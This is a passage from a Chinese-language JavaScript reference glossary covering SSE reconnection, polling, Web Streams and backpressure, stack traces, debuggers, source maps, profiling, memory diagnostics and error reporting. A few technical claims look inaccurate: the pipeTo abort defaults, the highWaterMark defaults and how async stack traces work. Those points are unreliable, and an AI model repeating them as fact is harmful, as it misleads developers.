也见 [Last-Event-ID（最后事件 ID）](#last-event-id最后事件-id)、[Heartbeat（心跳保活）](#heartbeat心跳保活)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### Last-Event-ID（最后事件 ID）

`Last-Event-ID` 是 SSE 断线重连时浏览器**自动带上**的请求头，值是客户端收到的最后一个 `id:` 字段。服务端据此就能只补发「这条之后」的事件，让重连对用户完全无感。关键细节：它是 SSE 相对手写轮询最实用的一个设计——**「断点续传」的语义被标准化了**；但服务端必须自己维护事件缓冲区（按 ID 可检索），且**缓冲区长度有限**，如果客户端离线太久、ID 已被淘汰，服务端应主动回一个「从头开始」的信号（如自定义事件）让客户端做全量刷新，而不是静默地丢事件。WebSocket 场景下等价机制要靠自己在消息协议里实现。

也见 [Auto-reconnect（断线重连）](#auto-reconnect断线重连)、[Event Stream Format（事件流格式）](#event-stream-format事件流格式)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### Polling（轮询）

轮询是「客户端定时发请求问有没有新数据」的方案：`setInterval(() => fetch('/updates'), 3000)`。它实现最简单、兼容性最好、天然走标准 HTTP 语义（缓存、鉴权、代理都无痛），但代价是**延迟与开销的矛盾无法调和**——间隔短则请求量大（且绝大多数是空响应）、间隔长则消息延迟高。关键细节：轮询适合「更新频率低、实时性要求不高」的场景（如每 5 分钟同步一次配置）；一旦需求变成「秒级以内」，就应该在 SSE / WebSocket / 长轮询之间选型，而不是继续把间隔调小。

也见 [Long Polling（长轮询）](#long-polling长轮询)、[Server-Sent Events（服务器发送事件，SSE）](#server-sent-events服务器发送事件sse)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### Long Polling（长轮询）

长轮询是轮询的改良版：客户端发起请求后，服务端**把请求挂住不立即返回**，直到有新数据或超时才响应；客户端收到响应后立刻再发一个请求，从而形成「近似推送」的效果。它把空轮询的开销消掉、延迟降到接近实时，同时仍然是标准 HTTP（不需要 Upgrade，代理友好）。关键细节：长轮询会**长时间占用一个连接与一个服务端处理资源**（每个客户端一条挂起请求），并发上万时需要异步框架支撑，且要设置**小于中间设备超时的挂起时间**（常见 30–60 秒）以免连接被静默切断；相比之下 SSE 是「一次连接持续推」，语义更清晰、开销更小，能用 SSE 就不要用长轮询。

也见 [Polling（轮询）](#polling轮询)、[Server-Sent Events（服务器发送事件，SSE）](#server-sent-events服务器发送事件sse)、[WebSocket（WebSocket 协议）](#websocketwebsocket-协议)。

示例：[`36_realtime_and_streams/03_server_sent_events.js`](36_realtime_and_streams/03_server_sent_events.js)

### Web Streams API（Web 流 API）

Web Streams API 是「分块处理数据」的标准抽象，包含 `ReadableStream`、`WritableStream`、`TransformStream` 三个核心接口，浏览器与 Node 都内置（`globalThis.ReadableStream`）。它解决的是「数据太大不能一次读进内存」与「生产速度与消费速度不匹配」这两个问题：前者靠分块（chunk），后者靠背压。关键细节：它**不是**「更快的数组」——每个 chunk 都会经过一层 Promise 与队列调度，对小数据量的性能不如直接处理数组；它的真正价值在于**可组合**（`pipeThrough` 串起多个转换）与**跨平台**（同一份代码在浏览器和 Node 都能跑）。

也见 [ReadableStream（可读流）](#readablestream可读流)、[highWaterMark and Backpressure（highWaterMark 与背压）](#highwatermark-and-backpressurehighwatermark-与背压)。

示例：[`36_realtime_and_streams/04_web_streams_readable.js`](36_realtime_and_streams/04_web_streams_readable.js)

### ReadableStream（可读流）

`ReadableStream` 表示**一个可以逐块读取的数据源**，构造时传入 `start(controller)` / `pull(controller)` / `cancel(reason)` 三个可选回调：`pull` 只在消费者需要数据时被调用，这正是**背压**的实现位置——消费者慢，`pull` 就自然少被调用。典型来源包括 `fetch` 的 `response.body`、文件读流、`new ReadableStream({ start(c) { c.enqueue(...) } })` 手工构造的流。关键细节：一个流**只能被消费一次**（读完就 locked/closed），需要多处读取必须先 `tee()` 分流；`fetch` 的响应体只有在 `response.body` 被读取时才真正开始下载，直接 `await response.json()` 等于放弃了流式处理。

也见 [Reader（读取器）](#reader读取器)、[Controller（控制器）](#controller控制器)、[Web Streams API（Web 流 API）](#web-streams-apiweb-流-api)。

示例：[`36_realtime_and_streams/04_web_streams_readable.js`](36_realtime_and_streams/04_web_streams_readable.js)

### WritableStream（可写流）

`WritableStream` 表示**一个可以逐块写入的目的地**，构造时传入 `write(chunk, controller)`、`close()`、`abort(reason)`；它保证 `write()` 返回的 Promise 在**数据真正被接受后**才兑现，因此写入方可以通过 `await` 自然感知下游是否跟得上（这是「可写流的背压反馈」）。典型用途是把上游数据落到文件、HTTP 响应、日志收集器。关键细节：`write()` 返回的 Promise 若 reject，流会进入 error 状态，后续写入都会被拒绝——所以**错误必须在上游处理**，否则一处写失败会静默吃掉后面所有数据；`getWriter()` 拿到 writer 后同样要记得 `releaseLock()` 或 `close()`。

也见 [Controller（控制器）](#controller控制器)、[pipeThrough（管道传输）](#pipethrough管道传输)。

示例：[`36_realtime_and_streams/05_web_streams_transform.js`](36_realtime_and_streams/05_web_streams_transform.js)

### TransformStream（转换流）

`TransformStream` 是「一边读一边写」的中间环节：它自带一个 `readable` 和一个 `writable`，构造时提供 `transform(chunk, controller)`（把输入块加工成零个或多个输出块）、`flush(controller)`（输入结束后收尾，如补齐最后一行）、`start`。典型用途是逐块解析文本（按行切分 NDJSON / SSE）、解压缩、加解密、格式转换。关键细节：`transform` 里可以 `enqueue` **多个或零个**块（例如「攒够一行再输出」的缓冲逻辑），因此输入块数与输出块数不必一一对应；`flush` 是很多人漏掉的钩子，没有它最后一行的数据会滞留在缓冲区里被丢掉。

也见 [pipeThrough（管道传输）](#pipethrough管道传输)、[highWaterMark and Backpressure（highWaterMark 与背压）](#highwatermark-and-backpressurehighwatermark-与背压)。

示例：[`36_realtime_and_streams/05_web_streams_transform.js`](36_realtime_and_streams/05_web_streams_transform.js)

### Reader（读取器）

读取器是**消费可读流的入口对象**：`stream.getReader()` 返回 `ReadableStreamDefaultReader`，用 `await reader.read()` 拿到 `{ value, done }`，或者用 `for await (const chunk of stream)` 直接异步迭代（内部自动加锁）。关键细节：调用 `getReader()` 之后流会被**加锁**（`stream.locked === true`），此时再调用 `getReader()` 或在别处消费会抛 `TypeError`，必须 `reader.releaseLock()` 才能交还；`read()` 的 `value` 在流正常结束时最后一次是 `undefined`（且 `done` 为 `true`），把 `undefined` 当数据块处理是常见 bug 来源。需要「流中途退出但仍要排空」时用 `reader.cancel()` 并注意其语义差异。

也见 [ReadableStream（可读流）](#readablestream可读流)、[Controller（控制器）](#controller控制器)。

示例：[`36_realtime_and_streams/04_web_streams_readable.js`](36_realtime_and_streams/04_web_streams_readable.js)

### Controller（控制器）

控制器是**流内部用来操作流的句柄**，由流实现传给 `start`/`pull`/`transform` 回调。可读流的 `ReadableStreamDefaultController` 提供 `enqueue(chunk)`（送出一块）、`close()`（正常结束）、`error(err)`（以错误终止）；可写流的控制器提供 `error()` 与 `signal`（用于响应取消）。关键细节：**`enqueue` 的次数受队列水位限制**——当内部队列长度超过 `highWaterMark` 时，`pull` 不会被再次调用，这就是背压的落点；`controller.error()` 之后流进入 errored 状态，消费者会**在下一次 read 时收到该错误**（而不是立刻抛），忘记处理这个错误会导致未捕获的 rejection。

也见 [ReadableStream（可读流）](#readablestream可读流)、[highWaterMark and Backpressure（highWaterMark 与背压）](#highwatermark-and-backpressurehighwatermark-与背压)。

示例：[`36_realtime_and_streams/04_web_streams_readable.js`](36_realtime_and_streams/04_web_streams_readable.js)

### pipeThrough（管道传输）

`readable.pipeThrough(transformStream)` 把可读流接到一个转换流上并返回**转换后的新可读流**，是流式处理的组合方式：`response.body.pipeThrough(new TextDecoderStream()).pipeThrough(parseLines()).pipeTo(writer)`。它替代了手写的「读一块 → 转换 → 写一块」循环，并把**背压自动串起来**：下游慢，`transform` 的 `enqueue` 就会阻塞，进而让上游的 `pull` 不再被调用。关键细节：`pipeThrough` 返回的是新流，**原流已被占用**（不能再直接读）；`pipeTo` 是终结操作，返回 Promise 并在出错或取消时把错误传递到两端，但 **`pipeTo` 默认不会在失败时自动中止上游**（需要 `preventCancel`/`preventAbort` 相关选项配合）。

也见 [TransformStream（转换流）](#transformstream转换流)、[WritableStream（可写流）](#writablestream可写流)。

示例：[`36_realtime_and_streams/05_web_streams_transform.js`](36_realtime_and_streams/05_web_streams_transform.js)

### highWaterMark and Backpressure（highWaterMark 与背压）

`highWaterMark`（水位线）是流的**内部缓冲区容量上限**（可读流默认 1 块、可写流默认 1 块、一般为 0 表示「不缓冲」），它与**背压**（backpressure）是一体两面：缓冲区写满后就停止向上游索取数据，压力自然沿着管道传回数据源。背压的意义在于**防止内存被撑爆**——没有背压时，快生产 + 慢消费的结果就是队列无限增长，最终 OOM。关键细节：`ReadableStream` 的 `pull` 只在缓冲区低于水位线时被调用，这是背压的机制来源；`TransformStream` 的 `writableHighWaterMark`/`readableHighWaterMark` 需要分开设置，调大只会增加内存占用不会提升吞吐。**常见误解**：以为「加了 Streams 就有背压」——忽略 `pull` 返回值、或在 `start` 里循环 `enqueue` 会把背压绕过。

也见 [Controller（控制器）](#controller控制器)、[Web Streams API（Web 流 API）](#web-streams-apiweb-流-api)、[Full-duplex（全双工）](#full-duplex全双工)。

示例：[`36_realtime_and_streams/04_web_streams_readable.js`](36_realtime_and_streams/04_web_streams_readable.js)、[`36_realtime_and_streams/05_web_streams_transform.js`](36_realtime_and_streams/05_web_streams_transform.js)

### Web Streams and Node Streams（Web 流与 Node 流）

两套流 API 同时存在：**Node Streams**（`node:stream`，`Readable`/`Writable`/`Transform`，基于 EventEmitter、有 `pipe`、区分对象模式与字节模式）是 Node 生态的历史核心；**Web Streams** 是标准 API，浏览器与 Node 都有，也是 `fetch`、`Response.body`、`CompressionStream` 等新 API 的通用语言。二者语义相近但**接口不兼容**——Node 流靠事件与 `pipe`，Web 流靠 reader/writer 与 Promise，且背压的表达方式不同。互转由 `stream.Readable.fromWeb()` / `readable.toWeb()` 等适配器完成。关键细节：互转会有**性能开销**（每块数据要跨一层适配与 Promise 调度），在高吞吐场景应尽量让整条链路用同一套 API。

也见 [Web Streams API（Web 流 API）](#web-streams-apiweb-流-api)。

示例：[`36_realtime_and_streams/06_web_streams_vs_node_streams.js`](36_realtime_and_streams/06_web_streams_vs_node_streams.js)

## 调试与性能剖析

### Call Stack（调用栈）

调用栈是运行时维护的「**当前执行到哪、以及是谁调用到这里**」的后进先出结构：每进入一个函数就压入一帧，返回时弹出。它是判断错误发生路径的第一手资料，也是 `RangeError: Maximum call stack size exceeded`（栈溢出，通常由无限递归造成）背后的那个「栈」。关键细节：调用栈是**运行时状态**而非静态结构，异步代码里的「栈」会在每个 `await`/回调处断开，所以默认打印的栈往往只显示最后一段（这就是需要异步栈追踪的原因）；栈深度**有上限**（引擎相关，通常上万帧），递归深度过大的算法应改成显式栈或迭代。

也见 [Stack Frame（栈帧）](#stack-frame栈帧)、[Async Stack Traces（异步栈追踪）](#async-stack-traces异步栈追踪)。

示例：[`37_debugging_and_profiling/01_stack_traces.js`](37_debugging_and_profiling/01_stack_traces.js)

### Stack Frame（栈帧）

栈帧是调用栈里的**一项**，描述「某个函数的某次调用」：函数名、源文件与行列号、有时还有 `this` 与局部变量。`Error.stack` 字符串就是按「帧从近到远」排列的多行文本，每行一帧。关键细节：**帧上的位置是「调用点」而不是「定义点」**（对你定位问题时这通常正是想要的）；经过转译/压缩的代码里帧会显示为 `at a (bundle.js:1:23456)` 这种无意义位置，必须靠 Source Map 还原；帧顺序不能靠字符串解析来依赖（不同引擎格式不同），要结构化处理应使用 `Error.prepareStackTrace` 或 `error.captureStackTrace`。

也见 [Error.stack（错误堆栈）](#errorstack错误堆栈)、[Source Map（源码映射）](#source-map源码映射)。

示例：[`37_debugging_and_profiling/01_stack_traces.js`](37_debugging_and_profiling/01_stack_traces.js)

### Error.stack（错误堆栈）

`err.stack` 是错误对象上一个**非标准但被普遍支持**的字符串属性，内容是「错误消息 + 换行 + 各栈帧」，在构造 `Error` 时由引擎采集。它是排查线上问题最有价值的信息（能直接看到调用链），因此错误上报系统的核心字段就是它。关键细节：`stack` 是**惰性采集**且**只在创建错误那一刻准确**——如果把错误存起来稍后再读，采集时机由引擎决定，可能已经丢失上下文；跨语言/跨运行时序列化时 `stack` 可能丢失（`JSON.stringify(err)` 会得到 `{}`，因为消息与栈都不可枚举，必须手动挑字段）。

也见 [Stack Frame（栈帧）](#stack-frame栈帧)、[stackTraceLimit（堆栈深度上限）](#stacktracelimit堆栈深度上限)。

示例：[`37_debugging_and_profiling/01_stack_traces.js`](37_debugging_and_profiling/01_stack_traces.js)

### stackTraceLimit（堆栈深度上限）

V8 默认只采集**10 帧**栈信息（`Error.stackTraceLimit = 10`），超出的部分被丢弃——这是性能与信息量的折中，因为采集每一帧都有成本。它的实际影响是：一个深层调用链的报错在日志里只显示最后 10 层，看不到「最初的入口」。关键细节：可以在采集前临时调大（`Error.stackTraceLimit = 50`），也可以设为 `0` 关闭采集以提升热路径性能（在频繁创建错误的代码里这是有效的优化）；它是**全局设置**，修改会影响整个进程，所以应在入口处统一配置而不是散落在业务代码里。`Error.captureStackTrace(target, ctorOpt)` 则用于自定义错误类时把构造函数自身从栈里排除，让栈的第一帧指向真正的调用者。

也见 [Error.stack（错误堆栈）](#errorstack错误堆栈)。

示例：[`37_debugging_and_profiling/01_stack_traces.js`](37_debugging_and_profiling/01_stack_traces.js)

### Async Stack Traces（异步栈追踪）

异步栈追踪让跨越 `await`、回调、定时器的调用链**也能出现在同一个栈里**，显示为 `await` 之间的「async」分段。它解决了异步代码报错时「栈只有最后一段、看不到谁发起的」这一根本痛点——没有它，排查一个 Promise 链深处的错误几乎只能靠猜。关键细节：V8 通过 `Error.stackTraceLimit` 与「异步栈」机制实现，**默认行为随版本变化**（有时需要 `--async-stack-traces` 或 DevTools 的 Async 选项），且异步栈在**跨越事件循环边界**（如 `setTimeout` 回调里抛错）时可能断开；错误上报系统应把每一层的 `cause` 一起采集，才能补上异步断点。

也见 [Call Stack（调用栈）](#call-stack调用栈)、[Error.cause（错误原因链）](#errorcause错误原因链)。

示例：[`37_debugging_and_profiling/01_stack_traces.js`](37_debugging_and_profiling/01_stack_traces.js)

### Breakpoint（断点）

断点是调试器里「**执行到这一行就停下来**」的标记，暂停后可以查看局部变量、`this`、调用栈，并逐步执行（step over / step into / step out）。它比 `console.log` 强的地方在于**能观察完整的运行时状态并随时试探**（在控制台里改值、调用函数），但代价是需要交互式环境，因此无法用于线上。关键细节：断点有几种形态，除了行断点还有**条件断点**（满足表达式才停）、**日志断点**（不停，只打印，等于不用改代码的 `console.log`）、**DOM/事件/XHR 断点**（某类事件触发时停）；在 DevTools 的 Sources 面板设置即可，且**源码经 Source Map 映射后可以直接在原始 TS/JSX 文件上打断点**。

也见 [Conditional Breakpoint（条件断点）](#conditional-breakpoint条件断点)、[debugger Statement（debugger 语句）](#debugger-statementdebugger-语句)。

示例：[`37_debugging_and_profiling/02_debugger_and_inspect.js`](37_debugging_and_profiling/02_debugger_and_inspect.js)

### Conditional Breakpoint（条件断点）

条件断点是带**触发条件**的断点：只有表达式为真时才暂停。它解决的是「循环第一万次才出问题」的场景——普通断点会让你按一万次继续，而条件断点直接停在出问题的那一次。关键细节：条件表达式是在被调试的进程中求值的，因此**表达式本身有副作用或开销**（例如调用了一个会改状态的函数，或在每秒执行百万次的循环里做了昂贵计算）会影响被调试程序的时序甚至行为；排查偶发问题时，日志断点（不改代码的打印）往往比条件断点更安全，因为它完全不打断执行。

也见 [Breakpoint（断点）](#breakpoint断点)。

示例：[`37_debugging_and_profiling/02_debugger_and_inspect.js`](37_debugging_and_profiling/02_debugger_and_inspect.js)

### debugger Statement（debugger 语句）

`debugger;` 是一条**写在代码里的断点**：当开发者工具（或 Node 的调试器）处于连接状态时，执行到它就暂停；没有调试器时它是**空操作**，不影响生产运行。它适合「问题只在某个特定分支出现、不方便提前设断点」的场景：先把 `debugger` 放在可疑位置，等它命中再往里走。关键细节：它必须**清理**——留在生产代码里虽然没有功能影响，但一旦有人打开 DevTools 就会莫名其妙地中断，还会让打包产物带上一句无意义的语句；配合 `--inspect-brk` 时，`debugger` 语句是「非交互式调试」中最方便的下钻手段（Node 的 `node inspect` 也可以用它配合 `cont` 命令）。

也见 [Node Inspector（Node 调试器）](#node-inspectornode-调试器)、[Breakpoint（断点）](#breakpoint断点)。

示例：[`37_debugging_and_profiling/02_debugger_and_inspect.js`](37_debugging_and_profiling/02_debugger_and_inspect.js)

### Node Inspector（Node 调试器）

Node 通过 `--inspect`（启动并监听调试端口）、`--inspect-brk`（**在第一行暂停**，适合调试启动阶段）、`--inspect-port` 等参数开启内置调试器，之后可以用 Chrome DevTools（`chrome://inspect`）或 `node inspect` 命令行客户端连接。关键细节：`--inspect` **默认监听 127.0.0.1 的 9229 端口**，直接暴露到公网等于把任意代码执行权限交出去，远程调试必须走 SSH 隧道；`--inspect-brk` 是「调试只在启动时出现的问题」（如配置加载、模块初始化顺序）的关键手段，因为普通 `--inspect` 挂上调试器时启动早就跑完了；调试器附加时进程会被暂停，生产环境慎用。

也见 [Inspector Protocol（调试协议）](#inspector-protocol调试协议)、[debugger Statement（debugger 语句）](#debugger-statementdebugger-语句)。

示例：[`37_debugging_and_profiling/02_debugger_and_inspect.js`](37_debugging_and_profiling/02_debugger_and_inspect.js)

### Inspector Protocol（调试协议）

Inspector Protocol（也叫 Chrome DevTools Protocol）是**调试器与运行时之间的 JSON-RPC 协议**：调试器发送 `Debugger.setBreakpoint`、`Runtime.evaluate`、`Profiler.start` 等命令，运行时回事件（暂停、控制台输出、性能数据）。DevTools、VS Code 的调试器、`node inspect`、以及各种 APM 采集器本质上都是这个协议的客户端。关键细节：理解它的意义在于**「调试能力可以被程序化使用」**——你可以写脚本自动 attach 到进程、抓取 CPU profile、在指定位置取变量快照，这也是线上性能采样的实现基础；它默认无认证，因此端口暴露等同于远程代码执行。

也见 [Node Inspector（Node 调试器）](#node-inspectornode-调试器)、[CPU Profile and Flame Chart（CPU 剖析与火焰图）](#cpu-profile-and-flame-chartcpu-剖析与火焰图)。

示例：[`37_debugging_and_profiling/02_debugger_and_inspect.js`](37_debugging_and_profiling/02_debugger_and_inspect.js)

### Source Map（源码映射）

Source Map 是一份 **JSON 文件**（`.map` 或内联的 base64 data URL），记录「**生成代码的某个位置对应原始源码的哪个位置**」，让浏览器/Node 在调试时把压缩转译后的代码还原成原始文件与行号。没有它，生产环境的报错栈全是 `bundle.js:1:483729` 这种无用信息。关键字段包括 `version`、`sources`（原始文件列表）、`sourcesContent`（可内联原始内容，便于私有部署）、`mappings`（编码后的位置映射）、`file`、`sourceRoot`。关键细节：**Source Map 只在「生成位置 → 原始位置」方向可用**，反向（从源码行找到产物位置）需要额外索引；产物与 map 必须**版本对应**，发布了新版本却挂着旧 map 会让栈解析出错误的行号，比没有 map 更难排查。

也见 [mappings Field（mappings 映射表）](#mappings-fieldmappings-映射表)、[VLQ Encoding（VLQ 编码）](#vlq-encodingvlq-编码)。

示例：[`37_debugging_and_profiling/03_source_maps.js`](37_debugging_and_profiling/03_source_maps.js)

### mappings Field（mappings 映射表）

`mappings` 是 Source Map 里**唯一真正承载映射关系**的字段，格式是一串用 `,` 和 `;` 分隔的变长整数序列：`;` 表示「进入产物的下一行」，`,` 表示「同一行里的下一个映射段」，每段通常含四个数（生成列、源文件索引、原始行、原始列）。为了压缩体积，所有数字都相对**前一个同类型数字取增量**再编码。关键细节：`mappings` 的设计目标是**紧凑**而非可读（一个几十 KB 的 map 里 `mappings` 常占 90% 以上体积）；因为数字是增量编码的，**任何一位解码错误都会让后续所有映射错位**，所以自己写解析器时务必严格按规范实现 VLQ。

也见 [VLQ Encoding（VLQ 编码）](#vlq-encodingvlq-编码)、[Source Map（源码映射）](#source-map源码映射)。

示例：[`37_debugging_and_profiling/03_source_maps.js`](37_debugging_and_profiling/03_source_maps.js)

### VLQ Encoding（VLQ 编码）

VLQ（Variable Length Quantity，可变长数量编码）是 Source Map 里把整数压成 Base64 字符的编码方式：每个字符携带 6 位，**最高位是「续位」标记**（1 表示「还有后续字符」），最低位是符号位（负数标记），其余是数值位。它让「小的增量」只占一个字符，「大的数字」按需扩展，兼顾紧凑与通用。关键细节：解码时必须**区分「续位」与「符号位」**（常见的手写实现错误就是忘了符号位，导致负增量被解成正数、行号全乱）；同一个 VLQ 序列解码出的整数要**累加**到前一值上才是绝对位置，因此不能随机访问中间某段——必须从头顺序解码。

也见 [mappings Field（mappings 映射表）](#mappings-fieldmappings-映射表)。

示例：[`37_debugging_and_profiling/03_source_maps.js`](37_debugging_and_profiling/03_source_maps.js)

### Profiling（性能剖析）

性能剖析是「**测量程序把时间花在哪里**」的活动，与「凭感觉优化」相对：先量出热点（占时间最多的函数），再优化，再量一次确认有效。两种主流采集方式：**采样**（sample，每隔固定时间抓一次调用栈，开销小、适合线上）与**插桩**（instrumentation，记录每次函数进出、精确但开销大）。关键细节：剖析必须**先建基线**——没有基线数字，「优化后快了」只是感觉；同时要**在接近真实负载的条件下测**（开发机上的小数据量往往测不出真实热点，JIT 还会因为预热不足给出误导性结果）；剖析结果受采样频率与随机性影响，一次采样不足以下结论。

也见 [CPU Profile and Flame Chart（CPU 剖析与火焰图）](#cpu-profile-and-flame-chartcpu-剖析与火焰图)、[perf_hooks（性能钩子模块）](#perf_hooks性能钩子模块)。

示例：[`37_debugging_and_profiling/04_perf_hooks.js`](37_debugging_and_profiling/04_perf_hooks.js)

### CPU Profile and Flame Chart（CPU 剖析与火焰图）

CPU Profile 是一次采样剖析的原始结果（每个采样点记录当时的调用栈），火焰图则把它**可视化**：横轴是时间占比（宽度越大越耗时）、纵轴是调用深度，底部是入口函数、越往上是被调用的子函数。读图规则很实用：**宽的才是热点**（窄而高的火焰通常是「调用次数多但每次都很快」，未必值得优化）、**「平顶」表示叶子函数自身耗时**、**同一层重复出现的宽块**往往是循环或重复计算。关键细节：火焰图里会出现 `(anonymous)`、`(program)`、`(idle)` 这类合成帧，`(garbage collector)` 与 `(compiled code)` 帧则提示瓶颈可能来自 GC 或 JIT 编译；只看火焰图不看输入规模容易误判。

也见 [Profiling（性能剖析）](#profiling性能剖析)、[Inspector Protocol（调试协议）](#inspector-protocol调试协议)。

示例：[`37_debugging_and_profiling/04_perf_hooks.js`](37_debugging_and_profiling/04_perf_hooks.js)

### perf_hooks（性能钩子模块）

`node:perf_hooks` 是 Node 暴露性能计时能力的模块，核心成员是 `performance`（与浏览器同名的 Performance API 实现，Node 16+ 也挂在全局）、`PerformanceObserver`、`PerformanceEntry` 系列类型，以及 `monitorEventLoopDelay()` 这类 Node 特有的度量。它让「服务端哪个环节慢」可以被结构化测量，而不是靠 `console.time` 打日志。关键细节：`performance.now()` 返回**高精度单调时钟**（不受系统时间调整影响，这是它与 `Date.now()` 的关键区别——用 `Date.now()` 测耗时会在 NTP 校时或夏令时切换时得到负值或跳变）；`perf_hooks` 的所有时间单位都是**毫秒**（浮点）。

也见 [performance.mark and measure（标记与测量）](#performancemark-and-measure标记与测量)、[User Timing API（用户计时 API）](#user-timing-api用户计时-api)。

示例：[`37_debugging_and_profiling/04_perf_hooks.js`](37_debugging_and_profiling/04_perf_hooks.js)

### performance.mark and measure（标记与测量）

`performance.mark('name')` 在时间线上打一个**命名时间点**，`performance.measure('label', 'startMark', 'endMark')` 计算两个标记之间的时长并生成一条 `PerformanceMeasure` 条目，之后可以用 `performance.getEntriesByType('measure')` 取出分析。相比手写 `const t0 = performance.now()`，它的优势是**标记是全局可查询的命名锚点**（不同模块、不同库打的标记可以互相配对测量），也能与浏览器 DevTools 的 Performance 面板对齐。关键细节：`measure` 的参数是**标记名**而不是时间值，名字写错或标记未定义会抛错；标记会**累积在内存里**，长跑服务应定期 `clearMarks()`/`clearMeasures()`，否则会造成缓慢的内存增长。

也见 [User Timing API（用户计时 API）](#user-timing-api用户计时-api)、[PerformanceObserver（性能观察器）](#performanceobserver性能观察器)。

示例：[`37_debugging_and_profiling/04_perf_hooks.js`](37_debugging_and_profiling/04_perf_hooks.js)

### User Timing API（用户计时 API）

User Timing API 是 `mark`/`measure` 这套接口的规范名称（区别于 Navigation Timing、Resource Timing 等自动采集的时机），它把**业务自定义的性能数据**接入浏览器/Node 统一的性能时间线，从而能被 `PerformanceObserver`、DevTools 与真实用户监控（RUM）系统统一采集。关键细节：它只提供**测点**，不提供「该测什么」——有效的做法是围绕用户可感知的关键路径打点（首屏渲染完成、搜索出结果、支付提交成功），而不是给每个函数都打上；标记名建议带命名空间前缀（如 `app:checkout:start`），避免与第三方库的标记冲突。

也见 [performance.mark and measure（标记与测量）](#performancemark-and-measure标记与测量)。

示例：[`37_debugging_and_profiling/04_perf_hooks.js`](37_debugging_and_profiling/04_perf_hooks.js)

### PerformanceObserver（性能观察器）

`PerformanceObserver` 是**订阅性能条目**的统一入口：用 `observe({ entryTypes: ['measure', 'longtask', 'resource', ...] })` 注册，之后每产生一条符合条件的条目就触发回调，**不产生轮询开销**。它比「定时 `getEntries` 再对比」高效得多，也是采集长任务、资源加载、自定义测量、布局偏移的标准方式。关键细节：回调里拿到的条目**必须立刻处理或拷贝**——为节省内存，条目会被从缓冲区回收，把 `entry` 引用存到数组里稍后再读可能读到已失效的对象；采集应使用 `buffered: true` 以便拿到注册之前已产生的条目（否则注册前的数据会永久丢失）。

也见 [performance.mark and measure（标记与测量）](#performancemark-and-measure标记与测量)。

示例：[`37_debugging_and_profiling/04_perf_hooks.js`](37_debugging_and_profiling/04_perf_hooks.js)、[`31_performance_and_memory/16_web_vitals.js`](31_performance_and_memory/16_web_vitals.js)

### Memory Diagnostics（内存诊断）

内存诊断是定位「内存为什么一直涨」的系统方法，基本步骤是：先用 `process.memoryUsage()` / `performance.memory` 看**趋势**（是稳定在高位还是持续增长），再用堆快照（heap snapshot）做**对象级归因**（哪种对象最多、是谁持有的），最后对照常见泄漏模式修正（全局变量、未清理的定时器、闭包持有的外部引用、无上限的缓存、已移除但被引用的 DOM 节点）。关键细节：判断「泄漏」的关键不是**当前占用高**而是**经过多次 GC 后仍单调上升**；堆快照体积大且会让进程短暂停顿（生产环境慎用），通常做法是在 staging 环境复现或用采样堆剖析（heap sampling）替代全量快照。

也见 [process.memoryUsage（进程内存用量）](#processmemoryusage进程内存用量)、[Heap Statistics（堆统计）](#heap-statistics堆统计)。

示例：[`37_debugging_and_profiling/05_memory_diagnostics.js`](37_debugging_and_profiling/05_memory_diagnostics.js)、[`31_performance_and_memory/13_memory_profiling.js`](31_performance_and_memory/13_memory_profiling.js)

### process.memoryUsage（进程内存用量）

`process.memoryUsage()` 返回进程内存的分项统计，字段含义要分清才不会误判：`heapUsed`（V8 堆中**活跃对象**占用，通常是最该关注的指标）、`heapTotal`（V8 向系统申请的堆总量）、`rss`（Resident Set Size，进程实际占用的物理内存，包含堆外内存）、`external`（`Buffer`、`ArrayBuffer` 等由 C++ 层分配但由 JS 对象引用的内存）、`arrayBuffers`（`external` 中 ArrayBuffer 部分）。关键细节：**`rss` 高不等于内存泄漏**——`heapTotal` 涨上去后常常不会立刻归还系统；反过来 **`heapUsed` 稳定但 `rss` 一直涨**往往指向堆外/原生内存问题（如未释放的 Buffer、原生插件分配），`--max-old-space-size` 也管不住这部分。

也见 [Memory Diagnostics（内存诊断）](#memory-diagnostics内存诊断)、[Heap Statistics（堆统计）](#heap-statistics堆统计)。

示例：[`37_debugging_and_profiling/05_memory_diagnostics.js`](37_debugging_and_profiling/05_memory_diagnostics.js)

### Heap Statistics（堆统计）

堆统计由 `v8.getHeapStatistics()` / `v8.getHeapSpaceStatistics()` 提供，比 `process.memoryUsage()` 更细：能看到堆的**上限**（`heap_size_limit`，受 `--max-old-space-size` 影响）、各**分代空间**（new space、old space、code space、large object space）的容量与使用量。它是回答「还能撑多久」「该不该调大堆」的直接依据。关键细节：**`large object space` 的占用值得单独关注**——大于一定尺寸的对象直接进大对象空间，频繁创建大对象很容易把内存推高；`heap_size_limit` 与容器内存限制要对齐（容器 limit 1GB 而 Node 默认堆上限按宿主机内存推算时，进程会被 OOM Killer 杀掉而不是抛 JS 堆溢出错误）。

也见 [Memory Diagnostics（内存诊断）](#memory-diagnostics内存诊断)。

示例：[`37_debugging_and_profiling/05_memory_diagnostics.js`](37_debugging_and_profiling/05_memory_diagnostics.js)

### Production Error Reporting（生产环境错误上报）

生产环境错误上报是把线上发生的错误**采集、聚合、归因**的工程实践：在前端用 `window.onerror`、`unhandledrejection`、`ErrorBoundary` 兜底，在 Node 用 `process.on('uncaughtException')`、`unhandledRejection`（注意 `uncaughtException` 之后进程状态已不可信，正确做法是记录后**优雅退出**重启），再把错误连同上下文（用户 ID、版本、路由、设备、请求 ID、Source Map 解析后的真实栈）上报到 Sentry 这类系统。关键细节：**必须脱敏**（令牌、手机号、密码字段、URL 里的 query 参数都会不小心进入消息或栈），**必须做聚合**（按指纹归并同类错误，否则同一 bug 会产生海量条目），并且要上报**版本与 Source Map**，否则线上栈无法还原。

也见 [Error Severity and Alerting（错误分级与告警）](#error-severity-and-alerting错误分级与告警)、[Source Map（源码映射）](#source-map源码映射)。

示例：[`37_debugging_and_profiling/06_production_error_reporting.js`](37_debugging_and_profiling/06_production_error_reporting.js)

### Error Boundary（错误边界）

